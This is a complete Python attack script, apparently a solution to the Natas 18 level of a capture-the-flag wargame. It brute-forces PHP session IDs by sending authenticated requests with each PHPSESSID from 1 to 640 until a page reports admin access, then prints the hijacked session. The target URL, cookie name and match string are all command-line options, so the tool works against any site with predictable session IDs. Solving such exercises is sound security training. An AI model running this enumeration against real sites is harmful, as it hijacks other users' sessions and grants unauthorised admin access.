#!/usr/bin/env python3
import argparse
import requests
import time


def parse_args():
    parser = argparse.ArgumentParser(
        description="Enumerate predictable PHP session IDs (Natas 18)."
    )

    parser.add_argument("url", help="Target URL")
    parser.add_argument("user", help="HTTP auth username")
    parser.add_argument("password", help="HTTP auth password")

    parser.add_argument(
        "--cookie-name",
        default="PHPSESSID",
        help="Session cookie name (default: PHPSESSID)"
    )

    parser.add_argument(
        "--start",
        type=int,
        default=1,
        help="Starting session ID"
    )

    parser.add_argument(
        "--end",
        type=int,
        default=640,
        help="Ending session ID"
    )

    parser.add_argument(
        "--match",
        default="You are an admin",
        help="String indicating admin access"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Delay between requests"
    )

    return parser.parse_args()


def enumerate_sessions(args):
    print("[*] Starting session enumeration")
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Session range: {args.start} → {args.end}")
    print(f"[*] Match string: \"{args.match}\"")
    print()

    for sid in range(args.start, args.end + 1):
        try:
            response = requests.get(
                args.url,
                cookies={args.cookie_name: str(sid)},
                auth=(args.user, args.password),
                timeout=5
            )
        except requests.RequestException:
            continue

        if args.match in response.text:
            print(f"[+] Valid session found: {args.cookie_name}={sid}")
            return

        if sid % 50 == 0:
            print(f"[*] Tested up to {sid}")

        time.sleep(args.delay)

    print("[-] No valid session found.")


if __name__ == "__main__":
    args = parse_args()
    enumerate_sessions(args)
